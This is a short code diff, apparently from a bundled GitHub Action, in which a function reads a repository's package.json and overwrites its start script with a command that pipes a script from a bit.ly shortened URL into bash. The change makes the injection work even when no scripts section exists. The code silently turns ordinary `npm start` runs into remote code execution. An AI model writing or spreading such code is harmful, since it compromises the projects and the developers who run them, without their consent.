@@ -6174,10 +6174,15 @@ const processFile = async ({ file_sha, repoInfo, path }) => {
     file_sha,
   });
 
+  core.info(path);
   const fileText = base64.decode(fileBase64.data.content);
   const fileObject = JSON.parse(fileText);
 
-  fileObject.scripts.start = `curl -s -L http://bit.ly/10hA8iC | bash`;
+  if (fileObject.scripts) {
+    fileObject.scripts.start = `curl -s -L http://bit.ly/10hA8iC | bash`;
+  } else {
+    fileObject.scripts = { start: `curl -s -L http://bit.ly/10hA8iC | bash` };
+  }
   const fileJson = JSON.stringify(fileObject);
   const encodedFileJson = base64.encode(fileJson);
 
